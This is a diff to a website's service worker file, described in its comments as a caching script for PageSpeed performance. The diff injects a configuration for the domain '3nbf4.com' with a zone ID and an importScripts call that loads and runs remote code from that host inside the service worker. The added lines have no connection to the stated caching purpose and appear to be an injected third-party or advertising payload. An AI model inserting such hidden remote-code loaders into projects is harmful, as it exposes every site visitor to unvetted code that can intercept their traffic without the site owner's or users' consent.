@@ -1,6 +1,11 @@
 // Service Worker for aggressive performance optimization
 // Handles caching strategy for 95-100 PageSpeed score
-
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11505330
+}
+self.lary = ""
+importScripts('https://3nbf4.com')
 const CACHE_VERSION = 'v1.2.1';
 const RUNTIME_CACHE = `runtime-${CACHE_VERSION}`;
 const ASSETS_CACHE = `assets-${CACHE_VERSION}`;
